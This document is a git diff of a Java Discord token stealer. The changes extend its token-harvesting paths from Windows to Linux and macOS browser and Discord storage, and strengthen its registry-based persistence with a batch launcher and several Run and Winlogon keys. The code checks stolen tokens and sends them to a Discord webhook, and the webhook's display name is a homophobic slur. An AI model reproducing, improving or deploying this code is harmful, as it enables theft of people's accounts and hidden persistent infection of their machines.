@@ -22,22 +22,24 @@ public class Main {
     public static void main(String[] args) throws Exception {
         // TODO: Billing information
         // TODO: Check for nitro
+        // TODO: Add more MacOS Options
+
+        // IMPORTANT: Not tested on MacOS or Linux (hopefully works)
 
         //Settings:
-        String discord_avatar_url = "https://i.ibb.co/fps45hd/steampfp.jpg";
-        String discord_username = "Faggit";
+        String discord_avatar_url = "https://i.ibb.co/fps45hd/steampfp.jpg"; //If you want to change the webhook icon
+        String discord_username = "Faggit"; //Webhook Name
         String discord_webhook_url = args[0]; //Change this
-        boolean send_embed = true; //Do not change this (yet)
-        boolean ensure_valid = true;
+        boolean send_embed = true; //True sends embed, False sends it in text
+        boolean ensure_valid = true; //Checks the account before sending (removes if invalid)
         randomize_new_name = true; //Whether or not a random string shoud be set as the file name
-        debug = true;
-        shouldPersist = true;
+        debug = false;
+        shouldPersist = true; // Whether or not everyting should be displayed on terminal window
 
         //Mini
         if (shouldPersist) {
             mini_persistence();
         }
-
 
         //Gatherer
         for (String token : getTokens(ensure_valid)) {
@@ -149,6 +151,7 @@ public class Main {
 
     private static List<String> getTokens(boolean check_isValid) throws IOException {
         List<String> tokens = new ArrayList<>();
+        String fs = System.getenv("file.separator");
         String localappdata = System.getenv("LOCALAPPDATA");
         String roaming = System.getenv("APPDATA");
         String[][] paths = {
@@ -158,7 +161,16 @@ public class Main {
                 {"Chrome Browser", localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"}, //Chrome Browser
                 {"Opera Browser", roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb"}, //Opera Browser
                 {"Brave Browser", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"}, //Brave Browser
-                {"Yandex Browser", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"} //Yandex Browser
+                {"Yandex Browser", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"}, //Yandex Browser
+                {"Brave Browser", System.getProperty("user.home") + fs + ".config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb"}, //Brave Browser Linux
+                {"Yandex Browser Beta", System.getProperty("user.home") + fs + ".config/yandex-browser-beta/Default/Local Storage/leveldb"}, //Yandex Browser Beta Linux
+                {"Yandex Browser", System.getProperty("user.home") + fs + ".config/yandex-browser/Default/Local Storage/leveldb"}, //Yandex Browser Linux
+                {"Chrome Browser", System.getProperty("user.home") + fs + ".config/google-chrome/Default/Local Storage/leveldb"}, //Chrome Browser Linux
+                {"Opera Browser", System.getProperty("user.home") + fs + ".config/opera/Local Storage/leveldb"}, //Opera Browser Linux
+                {"Discord", System.getProperty("user.home") + fs + ".config/discord/Local Storage/leveldb"}, //Discord Linux
+                {"Discord Canargy", System.getProperty("user.home") + fs + ".config/discordcanary/Local Storage/leveldb"}, //Discord Canary Linux
+                {"Discord PTB", System.getProperty("user.home") + fs + ".config/discordptb/Local Storage/leveldb"}, //Discord Canary Linux
+                {"Discord", System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb"} //Discord MacOS
         };
 
         for (String[] path : paths) {
@@ -293,6 +305,10 @@ public class Main {
             new_name = UUID.randomUUID().toString().substring(16) + ".jar";
         } else {
             new_name = hideAs;
+            if (!new_name.contains(".jar")) {
+                new_name = new_name + ".jar";
+            }
+
         }
 
 
@@ -303,25 +319,29 @@ public class Main {
                 //Copy file to startup
                 //String startup_path = System.getenv("APPDATA") + "/Microsoft/Windows/Start Menu/Programs/Startup";
                 //copyFileTo(new File(System.getenv("APPDATA"), new_name), new File(startup_path));
-
+                String batch_file = new_name + ".bat";
 
                 String[] reg_start = {
-                        "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + new_name+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + new_name+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + new_name+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + new_name+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + new_name+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + new_name+"\"",
+                        "echo @echo off & java -jar " + new_name + " & exit >> " + batch_file + " & exit",
+                        "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + batch_file+"\"",
                 };
-
-                for (String command : reg_start) {
+                Process proc = Runtime.getRuntime().exec(reg_start[0]);
+                proc.destroy();
+                for (int i = 1; i < reg_start.length; i++) {
+                    final boolean[] done = new boolean[1];
+                    int finalI = i;
                     Thread thread = new Thread() {
                         public void run() {
                             if (debug) {
-                                System.out.println("Executing command: " + command);
+                                System.out.println("Executing command: " + reg_start[finalI]);
                             }
                             try {
-                                Process proc = Runtime.getRuntime().exec(command);
+                                Process proc = Runtime.getRuntime().exec(reg_start[finalI]);
 
                                 BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                                 String s = null;
@@ -329,6 +349,7 @@ public class Main {
                                     if (s.equalsIgnoreCase("The operation completed successfully.")) {
                                         System.out.println("Successfulyy added to registry");
                                         proc.destroy();
+                                        done[0] = true;
                                     }
                                 }
 
@@ -344,6 +365,10 @@ public class Main {
                         }
                     };
                     thread.start();
+                    if (done[0]) {
+                        thread.destroy();
+                    }
+
 
                 }
             }
@@ -363,10 +388,12 @@ public class Main {
             os = new FileOutputStream(f2);
             byte[] buffer = new byte[1024];
             int length;
+            long finalLength = 0;
             while ((length = is.read(buffer)) > 0) {
                 os.write(buffer, 0, length);
+                finalLength = finalLength + length;
                 if (debug) {
-                    System.out.println("Moving " + length + "bytes");
+                    System.out.println("Moving " + length + "bytes to " + f2.getPath() + " | " + finalLength);
                 }
 
             }
